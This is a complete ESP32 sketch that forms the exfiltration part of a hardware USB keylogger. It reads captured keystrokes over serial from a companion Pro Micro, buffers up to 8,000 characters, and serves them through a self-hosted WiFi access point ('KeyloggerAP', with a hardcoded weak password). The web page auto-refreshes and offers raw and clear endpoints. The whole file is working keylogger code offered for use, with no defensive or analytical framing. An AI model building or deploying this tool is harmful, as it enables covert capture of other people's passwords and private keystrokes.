// ================================================================
// USB Keylogger - ESP32 WiFi Web Server
// Board:   ESP32 Dev Module
// ================================================================

#include <WiFi.h>
#include <WebServer.h>

// ── WiFi Access Point credentials ────────────────────────────
const char* AP_SSID     = "KeyloggerAP";
const char* AP_PASSWORD = "password123";

// ── Serial from Pro Micro: GPIO16 (RX2), GPIO17 (TX2) ────────
#define RXD2 16
#define TXD2 17

WebServer server(80);

String keyLog     = "";
const int MAX_LOG = 8000;

// ── HTML Page ─────────────────────────────────────────────────
void handleRoot() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
  html += "<title>Keylogger</title>";
  html += "<style>";
  html += "body{font-family:monospace;background:#0a0a0f;color:#e8e8f0;padding:20px;}";
  html += "h1{color:#3a86ff;font-size:24px;}";
  html += ".count{color:#888;font-size:12px;margin-bottom:12px;}";
  html += "pre{background:#12121a;border:1px solid #2a2a3a;padding:16px;";
  html += "    border-radius:8px;white-space:pre-wrap;word-wrap:break-word;min-height:200px;}";
  html += "button{background:#3a86ff;color:#fff;border:none;padding:10px 20px;";
  html += "       border-radius:6px;cursor:pointer;font-size:14px;margin:5px;}";
  html += "button:hover{background:#2563eb;}";
  html += ".danger{background:#ff6b6b;}";
  html += ".danger:hover{background:#e63946;}";
  html += "</style>";
  html += "<meta http-equiv='refresh' content='5'>";
  html += "</head><body>";
  html += "<h1>USB Keylogger</h1>";
  html += "<p class='count'>Characters logged: " + String(keyLog.length()) + "</p>";
  html += "<pre>" + keyLog + "</pre><br>";
  html += "<a href='/clear'><button class='danger'>Clear Log</button></a>";
  html += "<a href='/'><button>Refresh</button></a>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleClear() {
  keyLog = "";
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "Cleared");
}

void handleRaw() {
  server.send(200, "text/plain", keyLog);
}

void handleNotFound() {
  server.send(404, "text/plain", "Not found");
}

// ── Setup ─────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  Serial2.begin(9600, SERIAL_8N1, RXD2, TXD2);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASSWORD);

  server.on("/",       handleRoot);
  server.on("/clear",  handleClear);
  server.on("/raw",    handleRaw);
  server.onNotFound(   handleNotFound);
  server.begin();
}

// ── Loop ──────────────────────────────────────────────────────
void loop() {
  server.handleClient();

  while (Serial2.available() > 0) {
    char c = (char)Serial2.read();
    keyLog += c;
  }

  if (keyLog.length() > MAX_LOG) {
    keyLog = "[...trimmed...]\n" +
             keyLog.substring(keyLog.length() - MAX_LOG);
  }

  delay(1);
}
